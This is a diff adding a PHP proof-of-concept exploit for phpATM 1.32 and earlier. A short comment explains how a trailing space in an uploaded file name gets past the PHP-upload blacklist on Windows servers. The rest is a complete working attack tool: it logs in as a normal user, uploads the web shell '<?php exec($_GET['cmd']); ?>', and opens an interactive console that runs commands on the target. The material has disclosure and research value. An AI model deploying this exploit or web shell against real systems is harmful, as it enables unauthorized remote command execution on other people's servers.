@@ -1,0 +1,220 @@
+<?php
+/*
+
+	Exploit Title : "phpATM <= 1.32 Remote Command Execution (Shell Upload) on Windows Servers"
+	Date          :  17/06/2016
+	Author        :  Paolo Massenio - pmassenio[AT]gmail
+	Vendor        :  phpATM - http://phpatm.org/
+	Version       :  <= 1.32
+	Tested on     :  Windows 10 with XAMPP
+	
+	__PoF__
+     
+    "phpATM is the acronym for PHP Advanced Transfer Manager and is a free, open source, PHP based Upload and Download manager. 
+	 But unlike most other of its kind it stores the data in flat text files and therefore does not require a database 
+	 like MySQL installed on the web server." 	
+
+	The bugged code is in the upload function.
+	Generally phpATM lets you to register, and then upload some files (no admin privileges required).
+	The hacking prevention is setted up by a regular expression to avoid .php files upload:
+	
+	----index.php----
+	[...]
+	1544    // Try if file exists Or file is script
+	1545		if (file_exists("$destination/$userfile_name") ||
+	1546		    eregi($rejectedfiles, $userfile_name) ||  <--- here the regex 
+	[...]
+	-----------------
+	
+	----conf.php----
+	[...]
+	307    $rejectedfiles = "^index\.|\.desc$|\.fdesc$|\.dlcnt$|\.vcnt$|\.php$|\.php\..*|\.php3$|\.php3\..*|\.cgi\..*|\.cgi$|\.pl$\.pl\..*|\.php4$|\.ns|\.inc$|\.php5";
+	[...]
+    ----------------
+	
+	So if we can upload a file with a space at the end, like this: "shell.php ", 
+	and the file system is running under Microsoft Windows, we can bypass the eregi, 
+	reaching the target to upload a php script file(like a shell)!
+	
+	The basic requirement is that the server is a Windows based server!
+	You can upload the shell using a local proxy, like burp suite, or use the exploit below.
+
+
+*/
+
+
+if(!isset($argv[1]) && !isset($argv[2]) && !isset($argv[3])){
+	printInfo();
+	exit;
+}
+
+echo "[+] OK trying to get the PHPSESSID.\n";
+
+$sessid = getPhpsessid($argv[1],$argv[2],$argv[3]);
+
+echo "[+] PHPSESSID for user '".$argv[2]."' grabbed (".$sessid.")\n";
+
+echo "[+] trying to upload the shell.\n";
+
+$shellname = uploadShell($argv[1],$sessid);
+
+echo "[+] OK shell is here: ".$argv[0]."/files/".trim($shellname)."?cmd=command\n\n";
+
+echo "[*] Do you want to run an interactive shell ? [Y/N] ";
+
+$line = fgets(STDIN);
+
+if(trim($line) == 'Y'){
+	runConsole($argv[1],$shellname);
+}
+
+echo "[+] bye\n";
+
+
+
+function printInfo(){
+	$intro = "[*] phpATM <= 1.32 Remote Command Execution (Shell Upload) on Windows Servers\n".
+			 "[*] Founded and coded by Paolo Massenio\n".
+			 "[***] The basic requirement is that the server is a Windows based server!\n".
+			 "[*] usage: php ".$argv[0]." server username password\n".
+			 "[*] Where:\n".
+			 "[*] server is the server with the correct path to phpATM\n".
+			 "[*] username and password are the credentials for the user with 'NORMAL USER' privileges\n".
+			 "[*] cmd is the command you want to execute (OPTIONAL)\n".
+			 "[*] e.g. : php ".$argv[0]." http://site.com/phpATM/ test test\n";
+			 
+	echo $intro;		 
+}
+
+function parseHeaders( $headers )
+{
+    $head = array();
+    foreach( $headers as $k=>$v )
+    {
+        $t = explode( ':', $v, 2 );
+        if( isset( $t[1] ) )
+            $head[ trim($t[0]) ] = trim( $t[1] );
+        else
+        {
+            $head[] = $v;
+            if( preg_match( "#HTTP/[0-9\.]+\s+([0-9]+)#",$v, $out ) )
+                $head['reponse_code'] = intval($out[1]);
+        }
+    }
+    return $head;
+}
+
+function getPhpsessid($server,$user,$pass){
+	$url = $server.'/login.php';
+	$data = array('action' => 'userlogin', 'user_name' => $user, 'user_pass' => $pass, 'Submit' => 'Enter');
+
+	$options = array(
+		'http' => array(
+			'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
+			'method'  => 'POST',
+			'content' => http_build_query($data)
+		)
+	);
+
+	$result = file_get_contents($url, false, stream_context_create($options));
+	$r_header = parseHeaders($http_response_header);
+
+	if ($result === FALSE) { 
+		die("[-] Error during request. Check if your connection is up or if you entered the correct name of the server.");
+	}
+
+	if(!isset($r_header['Location'])){
+		die("[-] You didn't entered a correct pair user/password.");
+	}
+
+	if(strpos($r_header['Server'],'Win') === false){
+		die("[-] The server isn't running on Windows. Can't run the exploit.");
+	}
+
+	$sessid =  trim(substr(strstr($r_header['Location'],'PHPSESSID'),10));
+	
+	return $sessid;
+	
+}
+
+function uploadShell($server,$phpsessid){
+
+	$MULTIPART_BOUNDARY= '--------------------------'.microtime(true);
+	$shellname = "0x".rand()."_gh0st.php ";  //notice the space after .php
+
+	$header  = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0\r\n";
+	$header .="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
+	$header .="Accept-Encoding: gzip, deflate\r\n";
+	$header .= "Cookie: PHPSESSID=$phpsessid\r\n";
+	$header .="Connection: close\r\n";
+	$header .= "Content-Type: multipart/form-data; boundary=$MULTIPART_BOUNDARY";
+
+
+	$content = "--$MULTIPART_BOUNDARY\r\n".
+				"Content-Disposition: form-data; name=\"action\"\r\n\r\n".
+				"upload\r\n";
+				
+	$content .= "--$MULTIPART_BOUNDARY\r\n".
+				"Content-Disposition: form-data; name=\"directory\"\r\n\r\n".
+				"\r\n";
+				
+	$content .= "--$MULTIPART_BOUNDARY\r\n".
+				"Content-Disposition: form-data; name=\"order\"\r\n\r\n".
+				"nom\r\n";
+				
+	$content .= "--$MULTIPART_BOUNDARY\r\n".
+				"Content-Disposition: form-data; name=\"direction\"\r\n\r\n".
+				"0\r\n";
+	 
+
+	$content .=  "--$MULTIPART_BOUNDARY\r\n".
+				"Content-Disposition: form-data; name=\"userfile\"; filename=\"$shellname\"\r\n".
+				"Content-Type: application/octet-stream\r\n\r\n".
+				"<?php exec(\$_GET['cmd']); ?>\r\n"; 
+				
+	$content .= "--$MULTIPART_BOUNDARY\r\n".
+				"Content-Disposition: form-data; name=\"description\"\r\n\r\n".
+				"\r\n";
+
+	$content .= "--$MULTIPART_BOUNDARY--\r\n";
+
+	$options = array(
+		'http' => array(
+			  'method' => 'POST',
+			  'header' => $header,
+			  'content' => $content,
+		)
+	);
+
+	$url = $server.'/index.php?';
+
+	$result = file_get_contents($url, false, stream_context_create($options));
+	$r_header = parseHeaders($http_response_header);
+
+	if ($result === FALSE) { 
+		die("[-] Error during request. Check if your connection is up or if you entered the correct name of the server.");
+	}
+
+	if(!isset($r_header['reponse_code']) && intval($r_header['reponse_code']) != 200){
+		die("[-] Error during upload.");
+	}
+	
+	return $shellname;
+
+}
+
+function runConsole($server,$shellname){
+	
+	while(1){
+		echo "Insert cmd ('exit' to quit) > ";
+		$cmd = fgets(STDIN);
+		if(trim($cmd) == 'exit' ) die("[+] bye\n");
+		$query = $server."/files/".trim($shellname)."?cmd=".trim($cmd);
+		$result = file_get_contents($query);
+		echo $result."\n";
+	}
+	
+}
+
+
+?>
